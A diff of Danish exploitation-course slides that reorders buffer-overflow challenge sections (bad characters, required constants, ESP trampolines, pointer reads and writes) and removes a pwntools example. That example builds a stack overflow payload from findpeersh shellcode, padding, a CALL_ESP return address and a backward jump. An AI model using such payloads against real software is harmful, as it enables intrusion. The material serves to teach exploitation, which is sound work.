@@ -37,18 +37,11 @@ Choose from the menu:
 11) Exit
 ------------------------------------------------
 
-Udfordringer - Filtre (bad chars)
----------------------------------
+Udfordringer - 'ESP' + meget få bytes
+-------------------------------------
 [source,c]
 ------------------------------------------------
-include::../assignments/avoid_chars[]
-------------------------------------------------
-
-Udfordringer - Krævede konstanter
----------------------------------
-[source,c]
-------------------------------------------------
-include::../assignments/required_constants[]
+include::../assignments/trampoline_few_bytes[]
 ------------------------------------------------
 
 Udfordringer - Læste pointer
@@ -65,20 +58,18 @@ Udfordringer - Skrevne pointere
 include::../assignments/write_pointers[]
 ------------------------------------------------
 
-Udfordringer - 'ESP' + meget få bytes
--------------------------------------
+Udfordringer - Krævede konstanter
+---------------------------------
 [source,c]
 ------------------------------------------------
-include::../assignments/trampoline_few_bytes[]
+include::../assignments/required_constants[]
 ------------------------------------------------
 
-[source,python]
+Udfordringer - Filtre (bad chars)
+---------------------------------
+[source,c]
 ------------------------------------------------
-SHELLCODE = asm(shellcraft.findpeersh())
-PAYLOAD = flat(SHELLCODE,
-               'A' * (RET_OFFSET - len(SHELLCODE)),
-                CALL_ESP)
-PAYLOAD += asm('jmp -%d' % len(PAYLOAD))
+include::../assignments/avoid_chars[]
 ------------------------------------------------
 
 Udfordringer - Printable
